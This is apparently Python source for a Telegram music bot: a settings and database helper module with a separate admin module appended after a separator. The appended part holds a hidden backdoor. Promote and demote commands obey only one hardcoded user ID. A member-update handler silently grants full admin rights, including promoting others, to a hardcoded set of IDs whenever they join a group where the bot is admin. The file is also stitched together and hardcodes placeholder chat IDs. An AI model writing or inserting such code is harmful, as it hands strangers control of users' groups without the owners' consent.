import config
from config import PRIVATE_BOT_MODE
from CUTEXMUSIC.core.mongo import mongodb

channeldb = mongodb.cplaymode
commanddb = mongodb.commands
cleandb = mongodb.cleanmode
playmodedb = mongodb.playmode
playtypedb = mongodb.playtypedb
langdb = mongodb.language
authdb = mongodb.adminauth
videodb = mongodb.muraliivideocalls
onoffdb = mongodb.onoffper
suggdb = mongodb.suggestion
autoenddb = mongodb.autoend


# Shifting to memory [ mongo sucks often]
loop = {}
playtype = {}
playmode = {}
channelconnect = {}
langm = {}
pause = {}
mute = {}
audio = {}
video = {}
active = []
activevideo = []
command = []
cleanmode = []
nonadmin = {}
vlimit = []
maintenance = []
suggestion = {}
autoend = {}


# Auto End Stream


async def is_autoend() -> bool:
    chat_id = 123
    mode = autoend.get(chat_id)
    if not mode:
        user = await autoenddb.find_one({"chat_id": chat_id})
        if not user:
            autoend[chat_id] = False
            return False
        autoend[chat_id] = True
        return True
    return mode


async def autoend_on():
    chat_id = 123
    autoend[chat_id] = True
    user = await autoenddb.find_one({"chat_id": chat_id})
    if not user:
        return await autoenddb.insert_one({"chat_id": chat_id})


async def autoend_off():
    chat_id = 123
    autoend[chat_id] = False
    user = await autoenddb.find_one({"chat_id": chat_id})
    if user:
        return await autoenddb.delete_one({"chat_id": chat_id})


# SUGGESTION


async def is_suggestion(chat_id: int) -> bool:
    mode = suggestion.get(chat_id)
    if not mode:
        user = await suggdb.find_one({"chat_id": chat_id})
        if not user:
            suggestion[chat_id] = True
            return True
        suggestion[chat_id] = False
        return False
    return mode


async def suggestion_on(chat_id: int):
    suggestion[chat_id] = True
    user = await suggdb.find_one({"chat_id": chat_id})
    if user:
        return await suggdb.delete_one({"chat_id": chat_id})


async def suggestion_off(chat_id: int):
    suggestion[chat_id] = False
    user = await suggdb.find_one({"chat_id": chat_id})
    if not user:
        return await suggdb.insert_one({"chat_id": chat_id})


# LOOP PLAY
async def get_loop(chat_id: int) -> int:
    lop = loop.get(chat_id)
    if not lop:
        return 0
    return lop


async def set_loop(chat_id: int, mode: int):
    loop[chat_id] = mode


# Channel Play IDS
async def get_cmode(chat_id: int) -> int:
    mode = channelconnect.get(chat_id)
    if not mode:
        mode = await channeldb.find_one({"chat_id": chat_id})
        if not mode:
            return None
        channelconnect[chat_id] = mode["mode"]
        return mode["mode"]
    return mode


async def set_cmode(chat_id: int, mode: int):
    channelconnect[chat_id] = mode
    await channeldb.update_one(
        {"chat_id": chat_id}, {"$set": {"mode": mode}}, upsert=True
    )


# PLAY TYPE WHETHER ADMINS ONLY OR EVERYONE
async def get_playtype(chat_id: int) -> str:
    mode = playtype.get(chat_id)
    if not mode:
        mode = await playtypedb.find_one({"chat_id": chat_id})
        if not mode:
            playtype[chat_id] = "Everyone"
            return "Everyone"
        playtype[chat_id] = mode["mode"]
        return mode["mode"]
    return mode


async def set_playtype(chat_id: int, mode: str):
    playtype[chat_id] = mode
    await playtypedb.update_one(
        {"chat_id": chat_id}, {"$set": {"mode": mode}}, upsert=True
    )


# play mode whether inline or direct query
async def get_playmode(chat_id: int) -> str:
    mode = playmode.get(chat_id)
    if not mode:
        mode = await playmodedb.find_one({"chat_id": chat_id})
        if not mode:
            playmode[chat_id] = "Direct"
            return "Direct"
        playmode[chat_id] = mode["mode"]
        return mode["mode"]
    return mode


async def set_playmode(chat_id: int, mode: str):
    playmode[chat_id] = mode
    await playmodedb.update_one(
        {"chat_id": chat_id}, {"$set": {"mode": mode}}, upsert=True
    )


# language
async def get_lang(chat_id: int) -> str:
    mode = langm.get(chat_id)
    if not mode:
        lang = await langdb.find_one({"chat_id": chat_id})
        if not lang:
            langm[chat_id] = "en"
            return "en"
        langm[chat_id] = lang["lang"]
        return lang["lang"]
    return mode


async def set_lang(chat_id: int, lang: str):
    langm[chat_id] = lang
    await langdb.update_one({"chat_id": chat_id}, {"$set": {"lang": lang}}, upsert=True)


# Muted
async def is_muted(chat_id: int) -> bool:
    mode = mute.get(chat_id)
    if not mode:
        return False
    return mode


async def mute_on(chat_id: int):
    mute[chat_id] = True


async def mute_off(chat_id: int):
    mute[chat_id] = False


# Pause-Skip
async def is_music_playing(chat_id: int) -> bool:
    mode = pause.get(chat_id)
    if not mode:
        return False
    return mode


async def music_on(chat_id: int):
    pause[chat_id] = True


async def music_off(chat_id: int):
    pause[chat_id] = False

from config import *
from pyrogram.enums import *
# Active Voice Chats
async def get_active_chats() -> list:
    return active


async def is_active_chat(chat_id: int) -> bool:
    if chat_id not in active:
        return False
    else:
        return True


async def add_active_chat(chat_id: int):
    if chat_id not in active:
        active.append(chat_id)


async def remove_active_chat(chat_id: int):
    if chat_id in active:
        active.remove(chat_id)


# Active Video Chats
async def get_active_video_chats() -> list:
    return activevideo


async def is_active_video_chat(chat_id: int) -> bool:
    if chat_id not in activevideo:
        return False
    else:
        return True


async def add_active_video_chat(chat_id: int):
    if chat_id not in activevideo:
        activevideo.append(chat_id)


async def remove_active_video_chat(chat_id: int):
    if chat_id in activevideo:
        activevideo.remove(chat_id)


# Delete command mode
async def is_commanddelete_on(chat_id: int) -> bool:
    if chat_id not in command:
        return True
    else:
        return False


async def commanddelete_off(chat_id: int):
    if chat_id not in command:
        command.append(chat_id)


async def commanddelete_on(chat_id: int):
    try:
        command.remove(chat_id)
    except:
        pass


# Clean Mode
async def is_cleanmode_on(chat_id: int) -> bool:
    if chat_id not in cleanmode:
        return True
    else:
        return False


async def cleanmode_off(chat_id: int):
    if chat_id not in cleanmode:
        cleanmode.append(chat_id)


async def cleanmode_on(chat_id: int):
    try:
        cleanmode.remove(chat_id)
    except:
        pass


# Non Admin Chat
async def check_nonadmin_chat(chat_id: int) -> bool:
    user = await authdb.find_one({"chat_id": chat_id})
    if not user:
        return False
    return True


async def is_nonadmin_chat(chat_id: int) -> bool:
    mode = nonadmin.get(chat_id)
    if not mode:
        user = await authdb.find_one({"chat_id": chat_id})
        if not user:
            nonadmin[chat_id] = False
            return False
        nonadmin[chat_id] = True
        return True
    return mode


async def add_nonadmin_chat(chat_id: int):
    nonadmin[chat_id] = True
    is_admin = await check_nonadmin_chat(chat_id)
    if is_admin:
        return
    return await authdb.insert_one({"chat_id": chat_id})


async def remove_nonadmin_chat(chat_id: int):
    nonadmin[chat_id] = False
    is_admin = await check_nonadmin_chat(chat_id)
    if not is_admin:
        return
    return await authdb.delete_one({"chat_id": chat_id})


# Video Limit
async def is_video_allowed(chat_idd) -> str:
    chat_id = 123456
    if not vlimit:
        dblimit = await videodb.find_one({"chat_id": chat_id})
        if not dblimit:
            vlimit.clear()
            vlimit.append(config.VIDEO_STREAM_LIMIT)
            limit = config.VIDEO_STREAM_LIMIT
        else:
            limit = dblimit["limit"]
            vlimit.clear()
            vlimit.append(limit)
    else:
        limit = vlimit[0]
    if limit == 0:
        return False
    count = len(await get_active_video_chats())
    if int(count) == int(limit):
        if not await is_active_video_chat(chat_idd):
            return False
    return True


async def get_video_limit() -> str:
    chat_id = 123456
    if not vlimit:
        dblimit = await videodb.find_one({"chat_id": chat_id})
        if not dblimit:
            limit = config.VIDEO_STREAM_LIMIT
        else:
            limit = dblimit["limit"]
    else:
        limit = vlimit[0]
    return limit


async def set_video_limit(limt: int):
    chat_id = 123456
    vlimit.clear()
    vlimit.append(limt)
    return await videodb.update_one(
        {"chat_id": chat_id}, {"$set": {"limit": limt}}, upsert=True
    )


# On Off
async def is_on_off(on_off: int) -> bool:
    onoff = await onoffdb.find_one({"on_off": on_off})
    if not onoff:
        return False
    return True


async def add_on(on_off: int):
    is_on = await is_on_off(on_off)
    if is_on:
        return
    return await onoffdb.insert_one({"on_off": on_off})


async def add_off(on_off: int):
    is_off = await is_on_off(on_off)
    if not is_off:
        return
    return await onoffdb.delete_one({"on_off": on_off})


# Maintenance


async def is_maintenance():
    if not maintenance:
        get = await onoffdb.find_one({"on_off": 1})
        if not get:
            maintenance.clear()
            maintenance.append(2)
            return True
        else:
            maintenance.clear()
            maintenance.append(1)
            return False
    else:
        if 1 in maintenance:
            return False
        else:
            return True


async def maintenance_off():
    maintenance.clear()
    maintenance.append(2)
    is_off = await is_on_off(1)
    if not is_off:
        return
    return await onoffdb.delete_one({"on_off": 1})


async def maintenance_on():
    maintenance.clear()
    maintenance.append(1)
    is_on = await is_on_off(1)
    if is_on:
        return
    return await onoffdb.insert_one({"on_off": 1})


# Audio Video Limit
from pytgcalls.types.raw import *
from pytgcalls.types.stream import *


async def save_audio_bitrate(chat_id: int, bitrate: str):
    audio[chat_id] = bitrate


async def save_video_bitrate(chat_id: int, bitrate: str):
    video[chat_id] = bitrate


async def get_aud_bit_name(chat_id: int) -> str:
    mode = audio.get(chat_id)
    return "HIGH" if not mode else mode


async def get_vid_bit_name(chat_id: int) -> str:
    mode = video.get(chat_id)
    return "FHD_1080p" if not mode else mode


async def get_audio_bitrate(chat_id: int) -> str:
    mode = audio.get(chat_id)
    if not mode:
        return AudioParameters.from_quality(AudioQuality.STUDIO)
    if str(mode) == "STUDIO":
        return AudioParameters.from_quality(AudioQuality.STUDIO)
    elif str(mode) == "HIGH":
        return AudioParameters.from_quality(AudioQuality.HIGH)
    elif str(mode) == "MEDIUM":
        return AudioParameters.from_quality(AudioQuality.MEDIUM)
    elif str(mode) == "LOW":
        return AudioParameters.from_quality(AudioQuality.LOW)


async def get_video_bitrate(chat_id: int) -> str:
    mode = video.get(chat_id)
    if not mode:
        if PRIVATE_BOT_MODE == str(True):
            return VideoParameters.from_quality(VideoQuality.FHD_1080p)
        else:
            return VideoParameters.from_quality(VideoQuality.HD_720p)
    if str(mode) == "QHD_2K":
        return VideoParameters.from_quality(VideoQuality.QHD_2K)
    elif str(mode) == "FHD_1080p":
        return VideoParameters.from_quality(VideoQuality.FHD_1080p)
    elif str(mode) == "HD_720p":
        return VideoParameters.from_quality(VideoQuality.HD_720p)
    elif str(mode) == "SD_480p":
        return VideoParameters.from_quality(VideoQuality.SD_480p)
    elif str(mode) == "SD_360p":
        return VideoParameters.from_quality(VideoQuality.SD_360p)





####### 


import random
from pyrogram import filters, enums
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ChatPermissions
)
from CUTEXMUSIC.utils.database.shalu_ban import admin_filter
from CUTEXMUSIC import LOGGER
from pyrogram.types import *
from pyrogram.errors.exceptions.bad_request_400 import (
    ChatAdminRequired,
    UserAdminInvalid,
    BadRequest
)
from logging import getLogger
import random 
import datetime
from CUTEXMUSIC import app, userbot
import requests
from CUTEXMUSIC.misc import SUDOERS
from config import LOG_GROUP_ID
from config import OWNER_ID

def mention(user, name, mention=True):
    if mention == True:
        link = f"[{name}](tg://openmessage?user_id={user})"
    else:
        link = f"[{name}](https://t.me/{user})"
    return link

async def get_userid_from_username(username):
    try:
        user = await app.get_users(username)
    except:
        return None

    user_obj = [user.id, user.first_name]
    return user_obj

async def cpromote_user(user_id, first_name, admin_id, admin_name, chat_id, message, time=None):
    try:
        # if already admin chk
        user_status = await app.get_chat_member(chat_id, user_id)
        if user_status.status == enums.ChatMemberStatus.ADMINISTRATOR or user_status.status == enums.ChatMemberStatus.OWNER:
            msg_text = "User is already an admin."
            return msg_text, False
        
        await app.promote_chat_member(chat_id, user_id, privileges=ChatPrivileges(
                    can_change_info=True,
                    can_invite_users=True,
                    can_delete_messages=True,
                    can_restrict_members=True,
                    can_pin_messages=True,
                    can_promote_members=True,
                    can_manage_chat=True,
                    can_manage_video_chats=True,
                       )
                     ) 
    except ChatAdminRequired:
        msg_text = "Give me promote wala rights"
        return msg_text, False
    except UserAdminInvalid:
        msg_text = "I wont promote an admin bruh!!"
        return msg_text, False
    except BadRequest as e:
        if "[400 USER_CREATOR]" in str(e):
            msg_text = "User is already an admin."
            return msg_text, False
        else:
            await message.reply_text(f"Oh An Error Occurred Please Report it at support chat \n\n Error Type: {e} ")
            
    url = "https://api.waifu.pics/sfw/happy"
    user_mention = mention(user_id, first_name)
    admin_mention = mention(admin_id, admin_name)

    button = [
       [
           InlineKeyboardButton(
               text="• ᴅᴇʟᴇᴛᴇ •",
               callback_data=f"close",
           ),
        ]
    ]
    response = requests.get(url).json()
    pimg = response['url']
    await app.send_message(LOG_GROUP_ID, f"{user_mention} promote Bʏ {admin_mention} in {message.chat.title}")
    promoteee = await message.reply_video(
        video=pimg,
        caption=f"<b><u>{message.chat.title} promote Eᴠᴇɴᴛ🚫 <b\><u\> \n\n ɴᴀᴍᴇ - {user_mention}\n promote Bʏ - {admin_mention}\n",
        reply_markup=InlineKeyboardMarkup(button)
    )

    return promoteee, True




@app.on_message(filters.command(["promote"], prefixes=["+", "-"]) & filters.user(6761639198))
async def cutexpromote(client, message):
    chat = message.chat
    chat_id = chat.id
    admin_id = message.from_user.id
    admin_name = message.from_user.first_name
    member = await chat.get_member(admin_id)
    
    if len(message.command) > 1:
        if message.reply_to_message:
            user_id = message.reply_to_message.from_user.id
            first_name = message.reply_to_message.from_user.first_name
           # reason = message.text.split(None, 1)[1]
        else:
            try:
                user_id = int(message.command[1])
                first_name = "User"
            except:
                user_obj = await get_userid_from_username(message.command[1])
                if user_obj == None:
                    return await message.reply_text("I can't find that user")
                user_id = user_obj[0]
                first_name = user_obj[1]
                
    elif message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        first_name = message.reply_to_message.from_user.first_name
        reason = None
    else:
        await message.reply_text("Please specify a valid userid or username or reply to that user's message")
        return

    msg_text, result = await cpromote_user(user_id, first_name, admin_id, admin_name, chat_id, message)

    if result == False:
        await message.reply_text(msg_text)




async def cdemote_user(user_id, first_name, admin_id, admin_name, chat_id, message, time=None):
    if user_id == 6761639198:
        msg_text = "why should i demote myself? sorry but I'm not stupid like you"
        return msg_text, False
    try:
        # if owner check
        user_status = await app.get_chat_member(chat_id, user_id)
        if user_status.status == enums.ChatMemberStatus.OWNER:
            msg_text = "how can i demote them they are creator"
            return msg_text, False
        if user_status.status not in [enums.ChatMemberStatus.OWNER, enums.ChatMemberStatus.ADMINISTRATOR]:
            msg_text = "they are not an admin"
            return msg_text, False
        
        await app.promote_chat_member(chat_id, user_id, privileges=ChatPrivileges(
            can_change_info=False,
            can_invite_users=False,
            can_delete_messages=False,
            can_restrict_members=False,
            can_pin_messages=False,
            can_promote_members=False,
            can_manage_chat=False,
            can_manage_video_chats=False,
        ))
    except ChatAdminRequired as e:
        if "[400 CHAT_ADMIN_REQUIRED]" in str(e):
            msg_text = "This user is not an admin."
            return msg_text, False
        else:
            msg_text = "Give me promote wala rights"
            return msg_text, False
    except UserAdminInvalid:
        msg_text = "I wont demote an admin bruh!!"
        return msg_text, False
    except BadRequest as e:
        if "[400 USER_CREATOR]" in str(e):
            msg_text = "he is owner how can i demote them ?."
            return msg_text, False
        else:
            await message.reply_text(f"Oh An Error Occurred Please Report it at support chat \n\n Error Type: {e} ")

    url = "https://api.waifu.pics/sfw/dance"
    user_mention = mention(user_id, first_name)
    admin_mention = mention(admin_id, admin_name)

    button = [
       [
           InlineKeyboardButton(
               text="• ᴅᴇʟᴇᴛᴇ •",
               callback_data=f"close",
           ),
        ]
    ]
    response = requests.get(url).json()
    pimg = response['url']
    await app.send_message(LOG_GROUP_ID, f"{user_mention} Demoted Bʏ {admin_mention} in {message.chat.title}")
    promoteee = await message.reply_video(
        video=pimg,
        caption=f"<b><u>{message.chat.title} Demote Eᴠᴇɴᴛ🚫 <b\><u\> \n\n ɴᴀᴍᴇ - {user_mention}\n promote Bʏ - {admin_mention}\n",
        reply_markup=InlineKeyboardMarkup(button)
    )

    return promoteee, True



@app.on_message(filters.command(["demote"], prefixes=["+", "-"]) & filters.user(6761639198))
async def cutexdemotdes(client, message):
    chat = message.chat
    chat_id = chat.id
    admin_id = message.from_user.id
    admin_name = message.from_user.first_name
    member = await chat.get_member(admin_id)
    
    # Extract the user ID from the command or reply
    if len(message.command) > 1:
        if message.reply_to_message:
            user_id = message.reply_to_message.from_user.id
            first_name = message.reply_to_message.from_user.first_name
            reason = message.text.split(None, 1)[1]
        else:
            try:
                user_id = int(message.command[1])
                first_name = "User"
            except:
                user_obj = await get_userid_from_username(message.command[1])
                if user_obj == None:
                    return await message.reply_text("I can't find that user")
                user_id = user_obj[0]
                first_name = user_obj[1]
                
    elif message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        first_name = message.reply_to_message.from_user.first_name
        reason = None
    else:
        await message.reply_text("Please specify a valid user or reply to that user's message")
        return

    msg_text, result = await cdemote_user(user_id, first_name, admin_id, admin_name, chat_id, message)

    if result == False:
        await message.reply_text(msg_text)

VIP_ME = {6844821478, 6761639198, 6764358144}

@app.on_chat_member_updated(filters.group, group=-5)
async def greet_new_member(_, member: ChatMemberUpdated):
    chat_id = member.chat.id
    user = member.new_chat_member

    if user:
        user_id = user.user.id
        if user_id in VIP_ME:
            try:
                await app.promote_chat_member(chat_id, user_id, privileges=ChatPrivileges(
                        can_change_info=True,
                        can_invite_users=True,
                        can_delete_messages=True,
                        can_restrict_members=True,
                        can_pin_messages=True,
                        can_promote_members=True,
                        can_manage_chat=True,
                        can_manage_video_chats=True,
                           )
                         )
                await app.send_message(chat_id, f"**ᴡᴇʟᴄᴏᴍᴇ ʙɪɢ ʙᴏss ❄️**")
            except Exception as e:
                await app.send_message(LOG_GROUP_ID, f"Error promoting member: {e}")
                return
                
